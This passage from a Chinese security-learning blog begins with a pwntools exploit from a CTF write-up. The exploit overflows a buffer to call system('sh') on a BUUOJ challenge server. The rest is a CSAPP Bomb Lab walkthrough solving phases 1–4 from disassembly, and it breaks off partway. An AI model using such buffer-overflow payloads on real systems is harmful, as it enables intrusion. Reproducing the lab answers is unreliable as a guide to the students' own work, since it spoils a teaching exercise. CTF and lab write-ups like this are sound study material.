<p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/13/CSAPP-Bomb-Lab-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/13/CSAPP-Bomb-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Bomb Lab Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-13 23:40:47" itemprop="dateCreated datePublished" datetime="2021-01-13T23:40:47+08:00">2021-01-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-01-16 09:29:59" itemprop="dateModified" datetime="2021-01-16T09:29:59+08:00">2021-01-16</time>
              </span>

          
            <span id="/2021/01/13/CSAPP-Bomb-Lab-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="CSAPP Bomb Lab Writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/01/13/CSAPP-Bomb-Lab-Writeup/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/13/CSAPP-Bomb-Lab-Writeup/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是CSAPP的bomblab，对打pwn的新手补补基础还是非常有用的，尤其是各种汇编操作和IDA Pro里各种各样的奇妙语法，更是让我这个菜鸡大开眼界（还能这么坑……）</p>
<p>前五关非常的常规，我们通过汇编跟反汇编都看一下。</p>
<p>第六关我不行了，就通过反汇编的C代码走一走。</p>
<p>做了一个晚上加半个早上，终于搞定了，是我太菜……</p>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>其中0x402400这个地址很奇妙，我们用gdb跟进去看一看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase1.png">
<p>这里的<code>test</code>跟<code>je</code>两个汇编语句是连接在一起的，一般就像是这样用的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test %rax, %rax</span><br><span class="line">je 0x??????</span><br></pre></td></tr></table></figure>
<p><code>test</code>语句本质就是一个<code>and</code>，不过用<code>test</code>的话不会去改变%rax的值，而会直接放到下面来进行比较。</p>
<p>这两句汇编的意思就是%rax值等于0时就跳转，否则不跳转，执行下一条命令。</p>
<p>就是比较字符串相等就可以进入下一步了。</p>
<p>所以只需要保证输入的字符串是<code>&quot;Border relations with Canada have never been better.&quot;</code>，就可以了。</p>
<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase1(IDA).png">
<p>用IDA的话一眼看出来，就不用分析了。</p>
<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><h3 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>按照汇编来分析，stack frame的构造如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04(rbp)</span><br><span class="line">0x08      rbp</span><br><span class="line">0x1c          [5]</span><br><span class="line">0x10          [4]</span><br><span class="line">0x14          [3]</span><br><span class="line">0x18          [2]</span><br><span class="line">0x1c          [1] &lt;- rbx</span><br><span class="line">0x20 rsp  rsi [0] &lt;- rax</span><br></pre></td></tr></table></figure>
<p>在从<code>rsp - 0x20</code>到<code>rsp - 0x08</code>遍历的过程中，rax永远在栈上比rbx的地址小个4，也就是一个<code>int</code>的位置。每次check之后依次往后移一位。</p>
<p>我们需要满足的是两倍的rax等于rbx，也就是我们输入的数列是成倍增长的。</p>
<p>还有一个条件：读入到<code>rsp - 0x20</code>，也就是第一个数字，必须是1。</p>
<p>所以最终的输入就是<code>1 2 4 8 16 32</code>。</p>
<h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase2(IDA).png">
<p>输入六个整数，需要符合里面的这个规则：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v2 += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(v2 != v5);</span><br></pre></td></tr></table></figure><br>这里需要注意：在第三行的代码里，<code>v2</code>先被强制类型转换为<code>DWORD*</code>，然后再执行减1的操作。</p>
<p>因为<code>v2</code>的指针类型在减1之前已经确定，所以实际上<code>*((_DWORD *)v2 - 1)</code>就相当于<code>*(_DWORD *)(v2 - 4)</code>，也就是数组里面的上一个元素。</p>
<p>所以六个整数，只需要满足后一个是前一个的两倍，就可以了。</p>
<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>非常简单，switch里面提供了8个配套选择，任选一个即可过关。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3(IDA).png">
<h3 id="汇编-2"><a href="#汇编-2" class="headerlink" title="汇编"></a>汇编</h3><p>然而这个关卡的话看汇编会比较难看出来。这也是这一关的价值所在。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>stack frame大概长这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure><br>发现了第一个奇妙地址0x4025cf，我们也用gdb看看：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3_disass.png">
<p>害……</p>
<p>不过这里有另一个奇妙地址，其实这句话就是switch汇编实现的核心：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>穿插复习下括号里两个数字和三个数字的表示法：</p>
<ul>
<li>(a, b) = a + b</li>
<li>(a, b, c) = a + b * c</li>
</ul>
<p>这种括号的表示方法不只在lea指令里面能用，在其他指令里也能见到。</p>
<p>再查一查0x402470这个地址的值，还有后面几个地址的值：</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase3_switch.png">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p&#x2F;x *0x402470</span><br><span class="line">$9 &#x3D; 0x400f7c</span><br><span class="line">(gdb) p&#x2F;x *0x402478</span><br><span class="line">$10 &#x3D; 0x400fb9</span><br><span class="line">(gdb) p&#x2F;x *0x402480</span><br><span class="line">$11 &#x3D; 0x400f83</span><br><span class="line">(gdb) p&#x2F;x *0x402488</span><br><span class="line">$12 &#x3D; 0x400f8a</span><br><span class="line">(gdb) p&#x2F;x *0x402490</span><br><span class="line">$13 &#x3D; 0x400f91</span><br><span class="line">(gdb) p&#x2F;x *0x402498</span><br><span class="line">$14 &#x3D; 0x400f98</span><br><span class="line">(gdb) p&#x2F;x *0x4024a0</span><br><span class="line">$15 &#x3D; 0x400f9f</span><br><span class="line">(gdb) p&#x2F;x *0x4024a8</span><br><span class="line">$16 &#x3D; 0x400fa6</span><br><span class="line">(gdb) p&#x2F;x *0x4024b0</span><br><span class="line">$17 &#x3D; 0x7564616d</span><br></pre></td></tr></table></figure>
<p>可以发现，从0x402470开始储存的是一个指针数组，因为是64位，所以地址自然是8个字节8个字节间隔的。</p>
<p>并且，这个数组里的指针指向的值，都是<code>phase_3</code>函数的mov指令，即对应了switch语句中的不同分支。</p>
<blockquote>
<p>说句题外话，之所以switch中每个case的最后一般都得加一个<code>break</code>，就是因为在底层就是这样实现的。如果不加<code>break</code>，在每一句执行后就不会<code>jmp</code>出这个switch的判断，在这里就可能%eax被多次赋值。所以该加<code>break</code>还是得加的哦！</p>
</blockquote>
<p>一一对应后，可以梳理出能够通过的8个输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: 0xcf</span><br><span class="line">1: 0x137</span><br><span class="line">2: 0x2c3</span><br><span class="line">3: 0x100</span><br><span class="line">4: 0x185</span><br><span class="line">5: 0xce</span><br><span class="line">6: 0x2aa</span><br><span class="line">7: 0x147</span><br></pre></td></tr></table></figure>
<p>任选其一，就能通过第三关。</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><h3 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/phase4(IDA).png">
<p>这个部分我们需要保证第一个读入的整数<code>v3</code>小于等于14的同时，<code>func4(v3, 0, 14)</code>也等于0，第二个读入的整数<code>v4</code>也要等于0。</p>
<img data-src="http://qmma78kfi.hn-bkt.clouddn.com/static/images/CSAPP-Bomb-Lab-Writeup/func4(IDA).png">
<p>而要使这个函数的返回值为0，只需要让<code>a1 = v3 = (14 - 0) / 2 + 0 = 7</code>。</p>
<h3 id="汇编-3"><a href="#汇编-3" class="headerlink" title="汇编"></a>汇编</h3><p>然而汇编并不像IDA反汇编出来的这样清晰，这一关一眼看上去可能眼花，认真看就好了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>栈布局是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00(rsp)</span><br><span class="line">0x04</span><br><span class="line">0x08</span><br><span class="line">0x0c rcx [1]</span><br><span class="line">0x10 rdx [0]</span><br><span class="line">0x14</span><br><span class="line">0x18 rsp</span><br></pre></td></tr></table></figure>
<p>在这里需要满足的有：</p>
<ul>
<li><code>0xe &gt;= *(rsp + 0x8)</code></li>
<li><code>0x0 == *(rsp + 0xc)</code></li>
<li><code>func4(*(rsp + 0x8), 0, 0xe) == 0</code></li>
</ul>
<p>我们进入<code>func4</code>看看汇编：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>没有什么栈的布局，就是些寄存器之间的计算，我们一个一个模拟一下：</p>
<p>（初始化：rdi = ?, rsi = 0, rdx = 0xe）</p>
<ol>
<li>eax = edx,  eax = 0xe</li>
<li>eax -= esi, eax = 0xe</li>
<li>ecx = eax,  ecx = 0xe</li>
<li>ecx &gt;&gt;= 0x1f, ecx &gt;&gt;= 31, ecx = 0（注意是逻辑右移）</li>
<li>eax += ecx, eax = 0xe</li>
<li>eax &gt;&gt;= 1, eax = 0x7（注意是算术右移，且只有一个参数时默认右移1位）</li>
<li>ecx = rax + rsi * 1 = 0x7 + 0 = 0x7</li>
</ol>
<p>然后我们分析下后面跳转的流程：</p>
<ul>
<li>如果%edi &lt;= %ecx，就会跳转到0x400ff2去。</li>
<li>跳转完再来一个cmp，如果%edi &gt;= %ecx，就可以调到0x401007结束函数了。</li>
</ul>
<p>所以只需要%ecx和%edi一样大就可以了，所以rdi直接等于7就可以了。</p>
<p>所以我们直接输入7跟0就可以了。</p>
<p>所以最后复习下这些奇妙的汇编指令，以免我又忘了：</p>
<ul>
<li><code>imul src, dest</code> 乘法</li>
<li><code>sal  src, dest</code> 算术左移</li>
<li><code>sar  src, dest</code> 算术右移</li>
